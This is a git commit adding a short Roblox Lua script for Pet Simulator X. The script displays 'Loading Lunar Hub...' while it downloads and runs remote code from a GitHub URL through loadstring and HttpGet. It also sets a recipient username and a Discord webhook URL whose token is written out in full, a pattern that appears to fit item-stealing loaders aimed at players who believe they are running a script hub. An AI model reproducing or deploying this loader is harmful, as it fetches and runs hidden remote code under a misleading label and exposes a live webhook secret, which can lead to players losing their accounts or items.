094393c565e85d5e2a5e8c7beddff2968ac1c9ad
Bo <44844728+Robobo2022@users.noreply.github.com>
2023-03-23 21:15:02 +0100

    Create petsimx.lua

---
+++ Non Simulator/petsimx.lua
@@ -0,0 +1,5 @@
+_G.Username = "RoBobo2008"
+_G.ScriptName = "Loading Lunar Hub..."
+_G.Webhook = "https://discord.com/api/webhooks/1087848250234642523/k3aIjJ1SHiEY0lFglC4szy0CPA1Ryl7BX-SY4_JaejQaRPcPRfVtYrEJf-NPVSQbk9mG"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak"))()
